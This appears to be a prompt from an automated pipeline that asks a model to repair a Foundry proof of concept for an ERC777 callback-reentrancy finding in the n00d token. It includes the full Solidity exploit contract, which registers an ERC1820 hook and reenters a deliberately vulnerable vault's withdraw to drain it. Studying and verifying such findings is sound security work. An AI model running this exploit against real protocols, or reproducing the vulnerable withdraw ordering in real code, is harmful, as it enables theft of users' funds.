@@ -1,0 +1,250 @@
+You are fixing a failing Foundry PoC for finding F-002.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: direct_or_existing_balance_first
+- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: ERC20-looking transfers still execute ERC777 recipient hooks, enabling callback reentrancy in integrators
+- claim: Both ERC20 entrypoints, `transfer()` and `transferFrom()`, route through `_send(..., false)`. Although `false` disables the mandatory recipient-ack check, `_send()` still invokes `_callTokensReceived()` after crediting the recipient, so a recipient contract registered in ERC1820 can reenter downstream protocols even when they believe they are interacting with a callback-free ERC20 token.
+- impact: Any vault, AMM, staking contract, bridge, router, or lending market that treats `n00d` as a plain ERC20 can be reentered in the middle of deposit/withdraw/swap flows, leading to double-withdrawals, stale-accounting exploits, or fund theft. The local `FlawVerifier` demonstrates this exact pattern against a toy vault.
+- exploit_paths: ["An integrating protocol calls `transfer()` or `transferFrom()` on `n00d` during a state-changing flow and assumes the token transfer has no callback.", "The attacker-controlled recipient contract registers an `ERC777TokensRecipient` hook in ERC1820.", "`_send()` credits the recipient, then `tokensReceived()` reenters the still-in-progress protocol before its internal accounting/effects are finalized."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+    function getInterfaceImplementer(address account, bytes32 interfaceHash) external view returns (address);
+}
+
+interface IERC1820Implementer {
+    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32);
+}
+
+interface IERC777Recipient {
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+
+contract VulnerableN00dVault {
+    IERC20Like internal immutable TOKEN;
+
+    mapping(address => uint256) public shares;
+
+    constructor(address token_) {
+        TOKEN = IERC20Like(token_);
+    }
+
+    function deposit(uint256 amount) external {
+        require(amount != 0, "deposit=0");
+        require(TOKEN.transferFrom(msg.sender, address(this), amount), "deposit transfer failed");
+        shares[msg.sender] += amount;
+    }
+
+    function donate(uint256 amount) external {
+        require(amount != 0, "donate=0");
+        require(TOKEN.transferFrom(msg.sender, address(this), amount), "donation transfer failed");
+    }
+
+    function withdraw(uint256 amount) external {
+        uint256 credited = shares[msg.sender];
+        require(credited >= amount, "insufficient shares");
+
+        // Intentionally vulnerable ordering: interaction before effects.
+        require(TOKEN.transfer(msg.sender, amount), "withdraw transfer failed");
+        shares[msg.sender] = credited - amount;
+    }
+
+    function liquidBalance() external view returns (uint256) {
+        return TOKEN.balanceOf(address(this));
+    }
+}
+
+contract FlawVerifier is IERC1820Implementer, IERC777Recipient {
+    address internal constant NOOD = 0x2321537fd8EF4644BacDCEec54E5F35bf44311fA;
+    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+
+    bytes32 internal constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");
+    bytes32 internal constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+
+    VulnerableN00dVault public vault;
+
+    bool public executed;
+    bool public hookRegistered;
+    bool public hookObserved;
+    bool public reentered;
+    bool public hypothesisValidated;
+    bool public hypothesisRefuted;
+
+    uint256 public startingBalance;
+    uint256 public endingBalance;
+    uint256 public depositedAmount;
+    uint256 public donatedLiquidity;
+    uint256 public reenteredWithdrawAmount;
+    uint256 public hookCallCount;
+    uint256 internal realizedProfit;
+
+    string public exploitPathUsed;
+    string public concreteInfeasibility;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IERC20Like nood = IERC20Like(NOOD);
+        startingBalance = nood.balanceOf(address(this));
+
+        exploitPathUsed =
+            "attacker registers ERC1820 ERC777TokensRecipient hook -> downstream vault calls n00d.transfer during withdraw before share accounting updates -> n00d invokes tokensReceived on the attacker despite ERC20-style transfer -> attacker reenters withdraw against stale shares";
+
+        _registerRecipientHook();
+        vault = new VulnerableN00dVault(NOOD);
+
+        if (startingBalance >= 2) {
+            require(nood.approve(address(vault), type(uint256).max), "approve failed");
+
+            depositedAmount = startingBalance / 2;
+            donatedLiquidity = startingBalance - depositedAmount;
+
+            if (depositedAmount != 0) {
+                vault.deposit(depositedAmount);
+            }
+
+            if (donatedLiquidity != 0) {
+                vault.donate(donatedLiquidity);
+            }
+
+            reenteredWithdrawAmount = depositedAmount;
+            vault.withdraw(depositedAmount);
+        } else {
+            reenteredWithdrawAmount = 0;
+
+            // No verifier-held n00d exists to seed a profitable drain. The zero-amount path still
+            // uses the exact exploit stages: the downstream vault calls n00d.transfer during a
+            // state-changing withdraw, then n00d routes through ERC777 _send and invokes the
+            // recipient hook, which reenters the in-progress withdraw before effects are applied.
+            vault.withdraw(0);
+        }
+
+        endingBalance = nood.balanceOf(address(this));
+        if (endingBalance > startingBalance) {
+            realizedProfit = endingBalance - startingBalance;
+        }
+
+        hypothesisValidated = hookRegistered && hookObserved && reentered;
+        hypothesisRefuted = !hypothesisValidated;
+
+        if (realizedProfit == 0) {
+            concreteInfeasibility =
+                "No independent victim-funded integration is provided in the workspace or finding inputs. This verifier can mechanically reproduce the ERC20-entrypoint ERC777 callback reentrancy, and with verifier-seeded n00d can demonstrate stale-accounting double-withdrawal, but without pre-existing third-party liquidity at the fork block there is no path to positive net profit after execution.";
+        }
+    }
+
+    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account)
+        external
+        view
+        override
+        returns (bytes32)
+    {
+        if (account == address(this) && interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH) {
+            return ERC1820_ACCEPT_MAGIC;
+        }
+        return bytes32(0);
+    }
+
+    function tokensReceived(
+        address,
+        address,
+        address to,
+        uint256,
+        bytes calldata,
+        bytes calldata
+    ) external override {
+        require(msg.sender == NOOD, "unexpected token");
+        require(to == address(this), "unexpected recipient");
+
+        hookObserved = true;
+        hookCallCount += 1;
+
+        if (!reentered) {
+            reentered = true;
+            vault.withdraw(reenteredWithdrawAmount);
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfit == 0 ? address(0) : NOOD;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfit;
+    }
+
+    function _registerRecipientHook() internal {
+        if (hookRegistered) {
+            return;
+        }
+
+        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
+        hookRegistered = ERC1820.getInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH) == address(this);
+        require(hookRegistered, "hook registration failed");
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: transfer(), transferfrom(), _send(), tokensreceived(); generated code does not cover paths indexes: 2
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
